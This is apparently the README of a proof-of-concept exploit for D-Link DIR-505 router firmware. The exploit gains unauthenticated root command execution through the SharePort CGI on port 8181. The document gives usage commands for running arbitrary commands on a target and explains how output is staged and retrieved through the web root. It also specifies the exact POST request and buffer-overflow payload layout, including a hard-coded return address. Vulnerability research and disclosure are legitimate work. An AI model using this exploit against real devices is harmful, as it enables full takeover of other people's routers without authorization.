# PoC

`poc_shareport_unauth_rce.py` — pre-auth root RCE against DIR-505 A1 1.10B02 SharePort
(`webfile_cgi.cgi`, TCP/8181).

## Usage

```bash
python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --id
python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --cmd 'uname -a'
```

- `--id` runs `cat /proc/self/status`; the firmware has no `id` applet.
- `--cmd` runs an arbitrary command, but the string must not contain `&` or `=`
  because those are form-parser delimiters.
- Output is written to `/www/webfile_access/sp_<random>.txt` and fetched from
  `http://TARGET:8181/sp_<random>.txt`.
- The script cleans up the output file after printing it.

## Request shape

```text
POST /dws/api/ListRoot HTTP/1.1
Host: TARGET:8181
Content-Type: application/x-www-form-urlencoded
Content-Length: N

x=0<cmd>&<49 &>a=<1051-byte value>
```

Value:

```text
0x00 + "A"*1026 + 5 * p32(0) + p32(0x40d180)
```

See `raw_http_request.md` for the generator and address notes.
